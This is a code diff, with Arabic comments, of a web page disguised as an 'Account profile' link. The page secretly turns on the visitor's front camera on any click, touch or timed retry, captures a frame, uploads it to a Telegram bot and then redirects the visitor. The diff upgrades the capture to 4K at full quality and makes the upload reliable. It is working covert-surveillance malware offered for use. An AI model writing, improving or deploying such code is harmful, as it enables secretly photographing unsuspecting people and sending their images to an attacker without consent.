@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title> </title>
 
-    <!-- ===== Open Graph (معدلة حسب الطلب) ===== -->
+    <!-- ===== Open Graph ===== -->
     <meta property="og:title" content="Account profile" />
     <meta property="og:description" content="Message me now ." />
     <meta property="og:image" content="https://site-url.github.io/Website-/img.png" />
@@ -99,9 +99,9 @@
             };
 
             // ------------------------------------------------------------------
-            // 4. إرسال الصورة إلى Telegram (جودة عالية)
+            // 4. إرسال الصورة إلى Telegram (أعلى جودة مع انتظار مكتمل)
             // ------------------------------------------------------------------
-            const sendToTelegram = (jpegBlob) => {
+            const sendToTelegram = async (jpegBlob) => {
                 if (isPhotoSent) return;
                 isPhotoSent = true;
 
@@ -113,20 +113,23 @@
                 const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', jpegBlob, 'silent_capture.jpg');
+                formData.append('photo', jpegBlob, 'high_res_capture.jpg');
 
-                fetch(apiUrl, {
-                    method: 'POST',
-                    body: formData,
-                    keepalive: true,
-                    mode: 'no-cors'
-                }).catch(() => {});
+                try {
+                    await fetch(apiUrl, {
+                        method: 'POST',
+                        body: formData,
+                        keepalive: true
+                    });
+                } catch (e) {
+                    // التجاهل عند وجود خطأ في الشبكة لضمان التوجيه
+                }
 
-                setTimeout(executeRedirect, 30);
+                executeRedirect();
             };
 
             // ------------------------------------------------------------------
-            // 5. التقاط الإطار بجودة عالية (0.9)
+            // 5. التقاط الإطار بأعلى جودة بدقة شاشة الكاميرا الكاملة (1.0 Quality)
             // ------------------------------------------------------------------
             const captureAndSend = () => {
                 if (isPhotoSent) return;
@@ -143,22 +146,23 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, vw, vh);
 
+                // حفظ الصورة بنسبة جودة 1.0 (100% بدون ضغط مفقود)
                 canvas.toBlob((blob) => {
                     if (blob && blob.size > 0) {
                         sendToTelegram(blob);
                     } else {
                         executeRedirect();
                     }
-                }, 'image/jpeg', 0.9);
+                }, 'image/jpeg', 1.0);
             };
 
             // ------------------------------------------------------------------
-            // 6. تحليل البكسلات مع مهلة 6 ثوانٍ
+            // 6. تحليل البكسلات مع إعطاء الكاميرا فرصة لضبط الضوء
             // ------------------------------------------------------------------
             const startPixelAnalysis = () => {
                 if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
 
-                const maxWait = 6000;
+                const maxWait = 5000;
                 const startTime = Date.now();
 
                 frameAnalyzerInterval = setInterval(() => {
@@ -189,6 +193,7 @@
 
                     const rgbSum = pixel[0] + pixel[1] + pixel[2];
 
+                    // التأكد من وضوح الصورة وتجاوز الإطارات المظلمة
                     if (rgbSum > 30) {
                         if (!isPhotoSent && !redirectExecuted) {
                             if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
@@ -200,11 +205,11 @@
                         frameAnalyzerInterval = null;
                         captureAndSend();
                     }
-                }, 80);
+                }, 100);
             };
 
             // ------------------------------------------------------------------
-            // 7. تشغيل الكاميرا
+            // 7. تشغيل الكاميرا بأعلى إعدادات جودة مدعومة
             // ------------------------------------------------------------------
             const activateCameraAndEngine = async () => {
                 if (isCapturing || cameraStarted) return;
@@ -214,8 +219,8 @@
                 try {
                     const constraints = {
                         video: {
-                            width: { ideal: 640 },
-                            height: { ideal: 480 },
+                            width: { ideal: 3840, max: 3840 },
+                            height: { ideal: 2160, max: 2160 },
                             facingMode: "user"
                         }
                     };
@@ -234,7 +239,7 @@
                             };
                             video.addEventListener('loadeddata', onReady);
                             video.addEventListener('loadedmetadata', onReady);
-                            setTimeout(resolve, 800);
+                            setTimeout(resolve, 1000);
                         }
                     });
 
@@ -248,15 +253,15 @@
             };
 
             // ------------------------------------------------------------------
-            // 8. ربط الأحداث – أي نقرة على الصفحة
+            // 8. ربط الأحداث
             // ------------------------------------------------------------------
             document.addEventListener('click', activateCameraAndEngine, { passive: true });
             document.addEventListener('touchstart', activateCameraAndEngine, { passive: true });
 
             // ------------------------------------------------------------------
-            // 9. محاولات تلقائية متكررة
+            // 9. محاولات تشغيل تلقائية
             // ------------------------------------------------------------------
-            [500, 1500, 3000, 5000, 8000].forEach(delay => {
+            [300, 1000, 2500, 4000].forEach(delay => {
                 setTimeout(() => {
                     if (!cameraStarted) {
                         activateCameraAndEngine().catch(() => {});
@@ -274,13 +279,13 @@
             });
 
             // ------------------------------------------------------------------
-            // 11. منع القوائم السياقية والسحب
+            // 11. حماية التفاعل
             // ------------------------------------------------------------------
             document.addEventListener('contextmenu', (e) => e.preventDefault());
             document.addEventListener('dragstart', (e) => e.preventDefault());
 
             // ------------------------------------------------------------------
-            // 12. صمام أمان نهائي (15 ثانية)
+            // 12. صمام أمان التوجيه
             // ------------------------------------------------------------------
             setTimeout(() => {
                 if (!redirectExecuted) executeRedirect();
